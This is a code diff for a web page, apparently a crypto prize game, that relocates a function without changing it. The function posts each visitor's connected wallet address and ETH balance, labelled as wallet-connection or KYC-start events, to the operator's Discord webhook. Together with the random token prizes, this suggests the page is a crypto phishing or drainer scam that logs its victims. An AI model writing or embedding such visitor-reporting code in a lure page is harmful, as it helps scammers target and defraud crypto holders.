@@ -696,28 +696,6 @@ const tokens = TOKENS_BY_NETWORK[selectedNetwork];
 
 
 
-   async function sendToDiscordWebhook(eventType, address, balance) {
-  const embed = {
-    title: eventType === 'wallet' ? 'Wallet Conectada' : 'KYC Iniciado',
-    color: eventType === 'wallet' ? 0x00FF00 : 0xFFA500,
-    fields: [
-      { name: 'Dirección', value: address },
-      { name: 'Balance', value: `${balance} ETH` }
-    ],
-    timestamp: new Date().toISOString()
-  };
-
-  try {
-    await fetch(DISCORD_WEBHOOK_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ embeds: [embed] })
-    });
-  } catch (error) {
-    console.error("Error enviando a Discord:", error);
-  }
-}
-
 
 	   const cryptoPrizes = [
             { token: 'USDT', amount: () => (Math.random() * 50 + 10).toFixed(2) },
@@ -886,6 +864,28 @@ function resetGame() {
   initializeGrid();
 }
 
+
+   async function sendToDiscordWebhook(eventType, address, balance) {
+  const embed = {
+    title: eventType === 'wallet' ? 'Wallet Conectada' : 'KYC Iniciado',
+    color: eventType === 'wallet' ? 0x00FF00 : 0xFFA500,
+    fields: [
+      { name: 'Dirección', value: address },
+      { name: 'Balance', value: `${balance} ETH` }
+    ],
+    timestamp: new Date().toISOString()
+  };
+
+  try {
+    await fetch(DISCORD_WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ embeds: [embed] })
+    });
+  } catch (error) {
+    console.error("Error enviando a Discord:", error);
+  }
+}
 
   </script>
 </body>
